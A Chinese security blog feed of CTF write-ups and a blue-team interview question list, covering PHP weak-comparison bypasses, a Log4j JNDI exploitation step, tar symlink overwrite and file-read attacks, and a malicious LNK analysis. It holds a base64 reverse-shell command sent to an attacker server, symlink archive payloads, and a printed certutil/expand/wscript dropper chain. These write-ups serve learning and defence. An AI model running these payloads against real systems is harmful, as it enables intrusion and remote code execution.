class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$week_1</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>字符串与数字弱比较</p><blockquote><p>u5er_D0_n0t_b3g1n_with_4_numb3r</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;sdasd114514&#x27;</span> ==  <span class="number">114514</span></span><br><span class="line">    </span><br><span class="line">get --&gt; user=<span class="number">114514</span></span><br></pre></td></tr></table></figure></li><li><p>猜测$pass为字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;dbasdha&#x27;</span> == <span class="number">0</span> <span class="comment">//True</span></span><br><span class="line"></span><br><span class="line">get --&gt; pass=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>字符串与数字MD5相等</p><p>科学计数法绕过  <strong>0e开头的数字字符串</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s214587387a</span><br><span class="line">   </span><br><span class="line"><span class="number">1586264293</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]===<span class="string">&quot;Probius&quot;</span>) <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;Probius&quot;</span>,<span class="variable">$data</span>)===<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$week_2</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>array_search默认弱比较查找,返回查找成功元素的下标</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$week_1</span> &amp;&amp; <span class="variable">$week_2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$verify</span>))</span><br><span class="line">        <span class="comment">// ‮⁦HNCTF⁩⁦Welcome to</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;hn&quot;</span> == <span class="variable">$_GET</span>[<span class="string">&#x27;hn&#x27;</span>] &amp;‮⁦+!!⁩⁦&amp; <span class="string">&quot;‮⁦ Flag!⁩⁦ctf&quot;</span> == <span class="variable">$_GET</span>[‮⁦LAG⁩⁦ctf]) &#123; <span class="comment">//HN! flag!! F</span></span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">       </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Fine!you win&quot;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./<span class="subst">$want</span>&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5弱比较，数组绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span>&amp;verify[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221101183032110-1686150252660.png" alt="image-20221101183032110"></p><p>零宽度隐写，？？？？</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get --&gt; </span><br><span class="line">    </span><br><span class="line">hn=hn&amp;%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6LAG%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf=%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6%<span class="number">20</span>Flag!%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br></pre></td></tr></table></figure><p>通配符绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; want=f*</span><br></pre></td></tr></table></figure><h3 id="HNCTF-2022-WEEK3-logjjjjlogjjjj"><a href="#HNCTF-2022-WEEK3-logjjjjlogjjjj" class="headerlink" title="[HNCTF 2022 WEEK3]logjjjjlogjjjj"></a>[HNCTF 2022 WEEK3]logjjjjlogjjjj</h3><p>复现：<a href="https://blog.csdn.net/weixin_47179815/article/details/125654828">https://blog.csdn.net/weixin_47179815/article/details/125654828</a></p><p>本地环境：JDK版本1.8</p><p>攻击流程</p><ul><li><p>服务器运行攻击脚本生成payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64(反弹shell)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 服务器ip</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221101211620970-1686150252661.png" alt="image-20221101211620970"></p><ul><li><p>服务器监听端口</p></li><li><p>发送payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:xxx:<span class="comment">//xxxx/xxx&#125;</span></span><br><span class="line">将上面生成的payload放入（优先JDK）</span><br></pre></td></tr></table></figure><p>URL编码后发送请求</p><p><img src="/../images/image-20221101211959222-1686150252662.png" alt="image-20221101211959222"></p></li></ul><p>成功连接</p><img src="E:\typora img\image-20221101211512855.png" alt="image-20221101211512855" style="zoom:50%;" /><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="简单编码"><a href="#简单编码" class="headerlink" title="简单编码"></a>简单编码</h3><p>图片尾部有一串url编码后的字符</p><p><img src="/../images/image-20221102000004428-1686150252663.png" alt="image-20221102000004428"></p><h3 id="HNCTF-2022-Week1-线下单杀出题人（OSINT"><a href="#HNCTF-2022-Week1-线下单杀出题人（OSINT" class="headerlink" title="[HNCTF 2022 Week1]线下单杀出题人（OSINT)"></a>[HNCTF 2022 Week1]线下单杀出题人（OSINT)</h3><p><img src="/../images/image-20221101232202282-1686150252663.png" alt="image-20221101232202282"></p><p>首先从A图片中提取出经纬度</p><p><img src="/../images/image-20221101232242899-1686150252663.png" alt="image-20221101232242899"></p><p>因为这个经纬度是度分秒的形式，需要先转换为度数形式</p><p>格式转换：<a href="http://www.gzhatu.com/du2dfm.html">http://www.gzhatu.com/du2dfm.html</a></p><p>定位：<a href="http://www.gzhatu.com/dingwei.html">http://www.gzhatu.com/dingwei.html</a></p><p><img src="/../images/image-20221101232434815-1686150252663.png" alt="image-20221101232434815"></p><p>A图片中还有一个提示</p><p><img src="/../images/image-20221101232718045-1686150252663.png" alt="image-20221101232718045"></p><p>所以可以确定定位是正确的。</p><p>然后根据第二张图中的河流可以知道是往哪条路走的。</p><img src="E:\typora img\image-20221101232747393.png" alt="image-20221101232747393" style="zoom:67%;" /><p>用高德地图定位嘉兴电信大厦，往那条路找，找到</p><img src="E:\typora img\image-20221101232627057.png" alt="image-20221101232627057" style="zoom:67%;" /><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="string">&#x27;嘉兴市南湖区禾兴北路506号亚芬汀精品酒店&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())<span class="comment">#utf-8编码</span></span><br></pre></td></tr></table></figure><p>SSCTF{f833a4d17d35ca5da40f087950293d04}</p><p>也可以用exif工具查看</p><img src="E:\typora img\image-20221101234725942.png" alt="image-20221101234725942" style="zoom: 50%;" /><h3 id="HNCTF-2022-Week1-三生三世"><a href="#HNCTF-2022-Week1-三生三世" class="headerlink" title="[HNCTF 2022 Week1]三生三世"></a>[HNCTF 2022 Week1]三生三世</h3><p>弱密码爆破，图片base64隐写得到二维码，扫描后用栅栏密码解密，每组字数为3.</p><h3 id="HNCTF-2022-Week1-silly-zip"><a href="#HNCTF-2022-Week1-silly-zip" class="headerlink" title="[HNCTF 2022 Week1]silly_zip"></a>[HNCTF 2022 Week1]silly_zip</h3><p>伪加密+IHDR修改</p><h3 id="HNCTF-2022-Week1-piz-galf"><a href="#HNCTF-2022-Week1-piz-galf" class="headerlink" title="[HNCTF 2022 Week1]piz.galf"></a>[HNCTF 2022 Week1]piz.galf</h3><p>两次逆序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\pmb.galf&quot;</span> , <span class="string">&#x27;rb&#x27;</span> ).read()</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\flag.bmp&quot;</span> , <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f2.write(f[ ::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HW面试</title>
      <link href="/2023/05/31/HW%E9%9D%A2%E8%AF%95/"/>
      <url>/2023/05/31/HW%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>三次面试的集合</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><p>自我介绍</p></li><li><p>之前护网主要做什么</p></li><li><p>设备使用</p><p>用过哪些安全设备，具体产商，具体怎么用（语法是什么）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">监测中心（态势感知,整体：数量），威胁感知（告警数据包），分析中心（日志分析,行为分析），响应处置(策略管理，处置)，资产感知，报告生成</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">协议：  proto:ftp</span><br><span class="line">ip：   sip：源ip  dip：目的ip</span><br><span class="line">攻击成功：  normal_ret：success</span><br><span class="line">请求路径：uri：路径</span><br><span class="line">http状态码： status：404</span><br><span class="line">域名：host：域名</span><br><span class="line">请求体：    data：请求体数据</span><br><span class="line">UA：  agent：UA</span><br><span class="line">请求方法: method:请求方法</span><br><span class="line"></span><br><span class="line">检索web流量： host “” and sip “” and dip：*</span><br></pre></td></tr></table></figure><p>负责外网还是内网，有很多误报怎么办</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip+威胁情报社区</span><br><span class="line"></span><br><span class="line">告警是基于特定关键字、特定规则触发的，部分业务系统由于编码不规范，经常会触发告警，因此需要结合业务实际情况确定是否为正常业务行为触发的误报。比如sql中的1=1</span><br><span class="line"></span><br><span class="line">巡检，需要加入ip白名单</span><br></pre></td></tr></table></figure><p>如何判断攻击成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看响应包中的结果是否符合payload的执行结果</span><br><span class="line">或者手动复现</span><br></pre></td></tr></table></figure></li><li><p>sql注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql注入原理，方式，防御手段</span><br><span class="line">宽字节注入原理</span><br><span class="line">sql写shell的条件，具体的语句（追问：除了直接写入还有其他方法吗)</span><br><span class="line">sqlmap写shell的参数和原理</span><br><span class="line">使用sqlmap post注入的参数</span><br><span class="line">sql注入绕过waf的方式</span><br><span class="line">sql注入延时注入时，sleep函数被禁用了怎么办</span><br></pre></td></tr></table></figure></li><li><p>渗透测试流程从信息收集开始完整地讲讲</p></li><li><p>xxe有哪些利用方式</p></li><li><p>给你一个场景，thinkphp，可以文件上传，但是有白名单只能上传图片，怎么rce</p></li><li><p>了解过burp的dns功能吗</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看过dnslog日志吗</span><br></pre></td></tr></table></figure></li><li><p>讲一下挖矿木马的处置</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要用什么命令定位进程所对应的可执行文件</span><br><span class="line">新增用户怎么排查（windows和linux）</span><br><span class="line">用什么命令排查linux的特权用户 </span><br><span class="line">一直杀不掉怎么办（要看哪些文件/目录）</span><br></pre></td></tr></table></figure></li><li><p>java内存马类型</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">各自原理</span><br><span class="line">冰蝎的木马原理了解过吗</span><br></pre></td></tr></table></figure></li><li><p>渗透中如果机器不出网怎么办</p><p>追问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用的什么反向代理</span><br></pre></td></tr></table></figure></li><li><p>如果可以rce，但是无回显并且不出网怎么办</p></li><li><p>如果机子被上了cs木马，怎么检测出木马进程</p><blockquote><p><a href="http://weizn.net/?p=439">通过Sysmon日志检测Cobalt Strike木马 - Wayne’s Blog</a></p><p>心跳包</p><p>命令执行格式：cmd.exe的完整路径 + <span style="color: #ff0000;">大写&#x2F;C</span>参数 + 实际执行命令。</p></blockquote></li><li><p>wireshark用过吗</p></li><li><p>假设上传了webshell，攻击者会使用webshell管理工具进行连接，讲一下这些管理工具的流量特征</p></li><li><p>讲一下java的shiro，log4j等漏洞</p></li><li><p>有做过溯源吗，了解的说说</p></li><li><p>简历上说挖掘过逻辑漏洞，现在给你一个登录框，你有什么思路</p></li><li><p>假设有一个存储型xss，怎么进行持久化</p></li><li><p>如果通知机器上出现了一些可疑的文件和目录，怎么进行应急响应</p></li><li><p>讲一下文件上传黑白名单绕过</p><p>追问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中间件解析漏洞讲讲</span><br></pre></td></tr></table></figure></li><li><p>主机基线规范讲一下</p></li><li><p>如果护网期间出现了0day该怎么办</p><blockquote><p>查看资产中是否有0day涉及到的应用，如果存在，可以尝试修复或者进行复现，比如说使用公开的poc进行测试，看一下会留下什么痕迹，根据这些痕迹建立检测机制</p></blockquote></li><li><p>讲一下内网中的票据</p></li><li><p>windows事件状态码</p><p><img src="/../images/image-20230426165150875-1686284102691.png" alt="image-20230426165150875"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 6</title>
      <link href="/2023/05/31/NSSRound6/"/>
      <url>/2023/05/31/NSSRound6/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-6-Team-check"><a href="#NSSRound-6-Team-check" class="headerlink" title="[NSSRound#6 Team]check"></a>[NSSRound#6 Team]check</h1><h2 id="V1–任意文件上传"><a href="#V1–任意文件上传" class="headerlink" title="V1–任意文件上传"></a>V1–任意文件上传</h2><blockquote><p>服务端对上传的压缩包进行解压操作，并且没有对压缩包内容进行检查，导致可以通过符号链接达到任意覆盖&#x2F;上传文件的效果。</p></blockquote><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假设我们要覆盖&#x2F;home&#x2F;khaz&#x2F;shell目录下的1.sh文件</p><p><img src="/../images/image-20221020234420015-1686150537835.png" alt="image-20221020234420015"></p><p>那么我们首先可以先创建一个软链接指向这个目录，并将其打包成压缩包1。</p><p><img src="/../images/image-20221020234340481-1686150537835.png" alt="image-20221020234340481"></p><p>然后我们需要再创建一个与软链接名字相同的目录，并在这个目录下创建要覆盖的文件。然后将该目录打包为压缩包2。</p><p><img src="/../images/image-20221020234743494-1686150537835.png" alt="image-20221020234743494"></p><p>然后解压压缩包1，得到test，然后解压压缩包2，其中test&#x2F;clean.sh，因为当前目录下test是指向&#x2F;home&#x2F;khaz&#x2F;shell的，所以实际上会将clean.sh解压到&#x2F;home&#x2F;khaz&#x2F;shell下从而覆盖原来的clean.sh。</p><p><img src="/../images/image-20221020234513190-1686150537835.png" alt="image-20221020234513190"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>做的时候，发现反弹shell不生效，在本地测试后发现是因为没有给clean.sh权限，所以覆盖后就不能执行了。</p><p><img src="/../images/Snipaste_2022-10-21_18-51-12-1686150537835.png" alt="Snipaste_2022-10-21_18-51-12"></p><p>ps：这里还有一个思路就是既然可以任意上传&#x2F;覆盖文件，那么可以直接覆盖app.py文件。</p><p>​这是因为每次修改工作目录下的文件，flask都会自动重载文件。</p><p><img src="/../images/image-20221021202646267-1686150537835.png" alt="image-20221021202646267"></p><h2 id="V2–任意文件下载"><a href="#V2–任意文件下载" class="headerlink" title="V2–任意文件下载"></a>V2–任意文件下载</h2><blockquote><p>服务端对上传的压缩包进行解压操作，并且没有对压缩包内容进行检查，并提供下载功能。导致解压出来的文件如果是符号链接文件就可以下载任意文件。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>与v1相比不同点在于<code>su ctf -c /tmp/clean.sh</code>限制了用户权限，但是flask还是以root权限启动的，所以下载功能还是root权限。</p><p>构造符号链接指向<code>/flag</code>，利用下载功能就能够读取到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28187/download&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;test2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 5</title>
      <link href="/2023/05/31/NSSRound5/"/>
      <url>/2023/05/31/NSSRound5/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>思路一，用&#x2F;flag覆盖app.py文件，再访问&#x2F;source路由</p><p>这里覆盖完了之后，还可以访问路由的原因是<code>debug=False</code>，所以即使覆盖了app.py文件，但是flask运行所使用的文件并没有受到影响。</p><p>而如果<code>debug=True</code>，当我们修改文件时，flask就会自动重载文件。</p><p>此时覆盖flask运行文件（我本地是pyrce.py）</p><p>控制台</p><p><img src="/../images/image-20221022132313611-1686150585118.png" alt="image-20221022132313611"></p><p>访问&#x2F;source路由</p><p><img src="/../images/image-20221022132349822-1686150585118.png" alt="image-20221022132349822"></p><p>思路二，利用可以访问静态文件，先创建static目录（flask框架结构，静态文件放在static目录下），再将flag复制到static目录，访问&#x2F;static&#x2F;flag就能够下载flag文件。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF</title>
      <link href="/2023/05/31/NewstarCTF/"/>
      <url>/2023/05/31/NewstarCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="最后的流量分析"><a href="#最后的流量分析" class="headerlink" title="最后的流量分析"></a>最后的流量分析</h3><p>先按照数据包大小排列，看了几个包发现是sql布尔盲注（上周的sql我用的就是布尔盲注）。</p><p><img src="/../images/image-20221020130300434-1686150281425.png" alt="image-20221020130300434"></p><p>上图为正确回显</p><p>进行过滤</p><p><img src="/../images/image-20221020130340038-1686150281425.png" alt="image-20221020130340038"></p><p>一个一个找就行了</p><h3 id="奇怪的PDF-2"><a href="#奇怪的PDF-2" class="headerlink" title="奇怪的PDF 2"></a>奇怪的PDF 2</h3><p>下载下来是一个快捷方式，打开是《欺骗的艺术》这本书。😱</p><p>它是快捷方式，很自然就去看它指向了哪个文件</p><p><img src="/../images/image-20221020130709420-1686150281425.png" alt="image-20221020130709420"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">SystemRoot%\system32\cmd.exe /c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y</span></span><br><span class="line"></span><br><span class="line">for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y</span><br><span class="line"></span><br><span class="line">findstr.exe&quot;TVNDRgAAAA&quot;%tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.ex</span><br></pre></td></tr></table></figure><p>然后搜索msoia.exe就得到了类似的题</p><p><a href="https://www.anquanke.com/post/id/267031">https://www.anquanke.com/post/id/267031</a></p><p><a href="https://www.cnblogs.com/hed10ne/p/15841253.html">https://www.cnblogs.com/hed10ne/p/15841253.html</a></p><blockquote><p>目标的最大长度只有260个字符，而命令行参数的最大长度是4096个字符</p></blockquote><p>读取完整命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> win32com.client <span class="comment"># pip install pywin32</span></span><br><span class="line"></span><br><span class="line">shell = win32com.client.Dispatch(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">shortcut = shell.CreateShortCut(<span class="string">&quot;20200308-sitrep-48-covid-19.pdf.lnk&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Targetpath)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Arguments)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS D:\python3<span class="number">.8</span>\code&gt; python -u <span class="string">&quot;d:\python3.8\code\0.py&quot;</span></span><br><span class="line">C:\Windows\System32\cmd.exe</span><br><span class="line">/c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y&amp;<span class="keyword">for</span> /r C:\\Windows\\System32\\ %i <span class="keyword">in</span> (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&amp;findstr.exe <span class="string">&quot;TVNDRgAAAA&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&amp;expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &amp;wscript %tmp%\\9sOXN6Ltf0afe7.js</span><br></pre></td></tr></table></figure><p><code>oGhPGUDC03tURV.tmp</code>的文件头是MSCF，是微软的.cab压缩文件格式</p><p><img src="/../images/image-20221020131408248-1686150281425.png" alt="image-20221020131408248"></p><p>使用命令<code>expand %tmp%\\oGhPGUDC03tURV.tmp 